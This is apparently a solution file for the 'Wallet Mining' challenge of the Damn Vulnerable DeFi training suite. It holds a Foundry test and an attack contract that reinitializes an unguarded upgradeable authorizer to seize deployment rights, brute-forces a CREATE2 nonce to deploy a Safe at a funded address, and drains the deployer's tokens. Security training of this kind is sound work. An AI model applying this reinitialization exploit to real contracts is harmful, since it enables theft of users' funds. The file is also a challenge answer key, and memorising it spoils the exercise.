// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract WalletMiningAttack {
    WalletDeployer public walletDeployer;
    SafeProxyFactory public proxyFactory;
    address public singletonCopy;
    IERC20 public token;
    address public user;
    address public USER_DEPOSIT_ADDRESS;
    uint256 public DEPOSIT_TOKEN_AMOUNT;
    address public ward;

    constructor(
        WalletDeployer _walletDeployer,
        SafeProxyFactory _proxyFactory,
        address _singletonCopy,
        IERC20 _token,
        address _user,
        address _USER_DEPOSIT_ADDRESS,
        uint256 _DEPOSIT_TOKEN_AMOUNT,
        address _ward
    ) {
        walletDeployer = _walletDeployer;
        proxyFactory = _proxyFactory;
        singletonCopy = _singletonCopy;
        token = _token;
        user = _user;
        USER_DEPOSIT_ADDRESS = _USER_DEPOSIT_ADDRESS;
        DEPOSIT_TOKEN_AMOUNT = _DEPOSIT_TOKEN_AMOUNT;
        ward = _ward;
    }

    // Main attack function that orchestrates the entire exploit
    function attack(bytes memory userSignature) external {
        exploitStorageCollision();
        uint256 correctNonce = findCorrectNonceOffline();
        deployWallet(correctNonce);
        transferFunds(userSignature);
        transferTokenToWard();
    }

    // Exploit the storage collision vulnerability in the AuthorizerUpgradeable contract
    // This allows us to add our attack contract as an authorized ward
    function exploitStorageCollision() internal {
        address authorizerAddress = walletDeployer.mom();
        AuthorizerUpgradeable authorizer = AuthorizerUpgradeable(authorizerAddress);

        address[] memory newWards = new address[](1);
        newWards[0] = address(this);
        address[] memory newAims = new address[](1);
        newAims[0] = USER_DEPOSIT_ADDRESS;

        // Reinitialize the Authorizer contract, exploiting the lack of initialization check
        (bool success,) =
            address(authorizer).call(abi.encodeWithSelector(AuthorizerUpgradeable.init.selector, newWards, newAims));
        require(success, "Authorizer reinitialization failed");
    }

    // Find the correct nonce to deploy the Safe wallet at the expected USER_DEPOSIT_ADDRESS
    function findCorrectNonceOffline() internal view returns (uint256) {
        bytes memory initializer = getInitializer();
        bytes memory deploymentData = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(singletonCopy)));
        bytes32 deploymentHash = keccak256(deploymentData);

        for (uint256 nonce = 0; nonce < type(uint256).max; nonce++) {
            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
            address predictedAddress = address(
                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(proxyFactory), salt, deploymentHash))))
            );

            if (predictedAddress == USER_DEPOSIT_ADDRESS) {
                return nonce;
            }
        }

        revert("Correct nonce not found");
    }

    // Deploy the Safe wallet at the USER_DEPOSIT_ADDRESS using the correct nonce
    function deployWallet(uint256 correctNonce) internal {
        bytes memory initializer = getInitializer();
        bool success = walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, correctNonce);
        require(success, "Wallet deployment failed");
    }

    // Generate the initializer data for the Safe wallet setup
    function getInitializer() internal view returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = user;
        return abi.encodeWithSelector(
            Safe.setup.selector, owners, 1, address(0), "", address(0), address(0), 0, address(0)
        );
    }

    // Transfer the tokens from the deployed Safe to the user
    function transferFunds(bytes memory userSignature) internal {
        Safe userSafe = Safe(payable(USER_DEPOSIT_ADDRESS));
        bytes memory transferData = abi.encodeWithSelector(IERC20.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);

        (bool success,) = address(userSafe).call(
            abi.encodeWithSelector(
                Safe.execTransaction.selector,
                address(token),
                0,
                transferData,
                Enum.Operation.Call,
                0,
                0,
                0,
                address(0),
                payable(0),
                userSignature
            )
        );
        require(success, "Safe transaction failed");
    }

    // Transfer the token reward received from WalletDeployer to the ward
    function transferTokenToWard() internal {
        uint256 balance = token.balanceOf(address(this));
        require(balance > 0, "No tokens to transfer");
        require(token.transfer(ward, balance), "Failed to transfer token to ward");
    }
}

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    address constant SAFE_SINGLETON_FACTORY_ADDRESS = 0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7;
    bytes constant SAFE_SINGLETON_FACTORY_CODE =
        hex"7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe03601600081602082378035828234f58015156039578182fd5b8082525050506014600cf3";

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerFactory authorizerFactory = new AuthorizerFactory();
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Include Safe singleton factory in this chain
        vm.etch(SAFE_SINGLETON_FACTORY_ADDRESS, SAFE_SINGLETON_FACTORY_CODE);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = new WalletDeployer(address(token), address(proxyFactory), address(singletonCopy));

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        // Deploy the WalletMiningAttack contract with all necessary parameters
        WalletMiningAttack attacker = new WalletMiningAttack(
            walletDeployer,
            proxyFactory,
            address(singletonCopy),
            IERC20(address(token)),
            user,
            USER_DEPOSIT_ADDRESS,
            DEPOSIT_TOKEN_AMOUNT,
            ward // Pass the correct ward address here
        );

        // Prepare the data for the token transfer from the Safe to the user
        bytes memory transferData = abi.encodeWithSelector(IERC20.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);

        // Calculate the transaction hash for the Safe transaction
        // This follows EIP-712 standard for structured data hashing
        bytes32 txHash = keccak256(
            abi.encodePacked(
                bytes1(0x19), // EIP-191 prefix
                bytes1(0x01), // EIP-712 version
                keccak256(
                    abi.encode(
                        keccak256("EIP712Domain(uint256 chainId,address verifyingContract)"),
                        block.chainid,
                        USER_DEPOSIT_ADDRESS
                    )
                ),
                keccak256(
                    abi.encode(
                        keccak256(
                            "SafeTx(address to,uint256 value,bytes data,uint8 operation,uint256 safeTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)"
                        ),
                        address(token), // to
                        0, // value
                        keccak256(transferData), // data
                        Enum.Operation.Call, // operation
                        0, // safeTxGas
                        0, // baseGas
                        0, // gasPrice
                        address(0), // gasToken
                        address(0), // refundReceiver
                        0 // nonce is 0 for a newly deployed Safe
                    )
                )
            )
        );

        // Sign the transaction hash with the user's private key
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
        bytes memory userSignature = abi.encodePacked(r, s, v);

        // Execute the complete attack
        attacker.attack(userSignature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}
